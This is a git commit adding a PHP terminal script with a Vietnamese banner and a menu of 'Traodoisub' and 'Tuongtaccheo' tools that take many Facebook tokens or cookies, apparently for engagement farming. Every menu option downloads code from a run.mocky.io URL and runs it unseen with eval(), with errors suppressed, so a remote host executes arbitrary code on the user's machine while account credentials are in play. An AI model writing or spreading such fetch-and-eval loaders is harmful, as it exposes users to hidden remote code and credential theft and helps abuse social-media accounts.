2ed192a4d4466c4f7f9be8595840b23b5d971951
doan2k4 <77579641+doan2k4@users.noreply.github.com>
2021-07-25 00:07:35 +0700

    Create doandinh.php

---
+++ doandinh.php
@@ -0,0 +1,153 @@
+
+error_reporting(0);
+
+ session_start();
+
+$end="\033[0m";
+
+$whiteb="\033[1;37m";
+
+$ress = "\033[0;32m";
+
+$res = "\033[0;33m";
+
+$red = "\033[0;31m";
+
+$green = "\033[0;37m";
+
+$yellow = "\033[0;33m";
+
+$white = "\033[0;33m";
+$xnhac = "\033[1;96m";
+
+$den = "\033[1;90m";
+
+$do = "\033[1;91m";
+
+$luc = "\033[1;92m";
+
+$vang = "\033[1;93m";
+
+$xduong = "\033[1;94m";
+
+$hong = "\033[1;95m";
+
+$trang = "\033[1;97m";
+
+$nenden = "\033[40m";
+
+$xanhd = "\033[0;36m";
+
+$nendo = "\033[41m";
+
+$nenxanh = "\033[42m";
+
+$nenvang = "\033[43m";
+
+$nenblue = "\033[44m";
+
+$nenPurpe = "\033[45m";
+
+$nenCyan = "\033[46m";
+
+$nentrang = "\033[47m";
+
+$UGreen = "\033[4;32m";
+
+$banner=
+"\r\r
+\033[0;93m╔════════════════════════════════════════════════╗
+\033[0;93m║\033[1;91m❥ \033[0;92mBản quyền: \033[1;97mDoãn Đình \033[1;93m ║\033[0;91m❥ \033[1;90mChạy Được Thì Chạy \033[0;93m  ║
+\033[0;93m║\033[1;91m❥ \033[0;92mYoutube:\033[1;97mCám Chăm Chỉ \033[1;93m ║\033[1;91m❥ \033[0;90mKhong Chạy Thì cut \033[1;93m  ║
+\033[0;93m║\033[1;91m❥ \033[0;92mZalo: \033[1;97m0971.932.146 \033[1;93m   ║\033[1;91m❥ \033[0;90mChờ Đợi Là Chân Ái !\033[1;93m ║
+\033[0;93m║\033[1;91m❥ \033[0;92mMomo:\033[1;97m0971.932.146 \033[1;93m    ║\033[1;91m❥ \033[0;90mAce Cày Xu Vui Vẻ \033[1;93m   ║
+\033[0;93m║\033[1;91m❥ \033[0;92mFb:\033[1;97mfacebook.com/doandinh2004        \033[1;93m          ║
+\033[0;93m╚════════════════════════════════════════════════╝\n";
+
+
+
+@system('clear');
+
+
+for($v=0;$v<= 10;$v++){ echo "\033[1;90m- ";usleep(15000); echo "\033[1;97m- ";usleep(15000); } echo "\033[1;90m- ";usleep(15000); echo "\033[1;97m-";usleep(15000); echo"\n"; 
+echo $banner;
+
+
+for($v=0;$v<= 10;$v++){ echo "\033[1;90m- ";usleep(15000); echo "\033[1;97m- ";usleep(15000); } echo "\033[1;90m- ";usleep(15000); echo "\033[1;97m-";usleep(15000); echo"\n\n"; 
+
+
+
+
+
+
+
+
+
+
+echo    "   \033[1;37m  \033[44mTool Miễn Phí Miễn Em Ngoan \033[0m\n";
+echo "\033[1;37m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n";
+echo "\033[1;37m┃\033[42mTool Trao Đổi Sub\033[0m                    \033[1;37m┃\n";                          
+echo "\033[1;37m┃                          \033[1;37m           ┃\n";
+echo "\033[1;37m┃ \033[1;33mNhập \033[1;33m1.\033[1;32mTool Traodoisub   \033[1;91m[\e[0;90mĐa Token\033[1;91m]\033[1;37m ┃\n";
+echo "\033[1;37m┃ \033[1;33mNhập \033[1;33m2.\033[1;32mTool Traodoisub   \033[1;91m[\e[0;90mĐa Cookie\033[1;91m]\033[1;37m┃\n";
+echo "\033[1;37m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m┃\n";                          
+echo "\033[1;37m┃\033[42mTool Tương Tác Chéo\033[0m\033[1;37m                  ┃\n";
+echo "\033[1;37m┃                                 \033[1;37m    ┃\n";                          
+echo "\033[1;37m┃ \033[1;33mNhập \033[1;33m3.\033[1;32mTool Tuongtaccheo \033[1;91m[\e[0;90mĐa Token\033[1;91m]\033[1;37m ┃\n";
+echo "\033[1;37m┃ \033[1;33mNhập \033[1;33m4.\033[1;32mTool Tuongtaccheo \033[1;91m[\e[0;90mĐa Cookie\033[1;91m]\033[1;37m┃\n";
+echo "\033[1;37m┃                                 \033[1;37m    ┃\n";                          
+echo "\033[1;37m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n";
+echo "\033[1;37m┗━\033[1;31m[\033[1;90mChọn Chế Độ\033[1;31m] \033[1;33m<=>\033[1;36m ";
+ 
+ echo $doandz."".$luc."Nhập Số: $vang";
+$nhaptool2 = trim(fgets(STDIN));
+if ($nhaptool2 == '1'){
+	if(!$sock = @fsockopen('www.google.com', 80))
+{
+    echo 'Vui lòng bật kết nối mạng';
+    exit();
+}
+	eval(get('https://run.mocky.io/v3/81e49e65-f17c-49ea-a401-d0a211a4d49e'));
+	
+}else if ($nhaptool2 == '2'){
+	eval(get('https://run.mocky.io/v3/0333123f-7769-4483-9dcf-def972e5af68'));
+	
+	
+	
+}else if ($nhaptool2 == '3'){
+	eval(get('https://run.mocky.io/v3/0611f513-93ff-4646-9724-50af4a7b30c7'));
+	
+	
+}else if ($nhaptool2 == '4'){
+eval(get('https://run.mocky.io/v3/e1e5698a-0b48-4334-9a8c-aea839dc8361'));
+	
+
+
+
+ 
+	eval(system(' Exit'));
+
+
+
+
+
+
+
+}else{exit($do."Nhập Sai\n");}
+function get($url){
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+    $headers = array();
+    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36';
+    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+    $headers[] = 'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5';
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    $result = curl_exec($ch);
+    if (curl_errno($ch)) {
+        echo 'Vui lòng kiểm tra lại kết nối hoặc có thể do lỗi máy chủ!';
+    }
+    curl_close($ch);
+    return $result;
+}
+ 
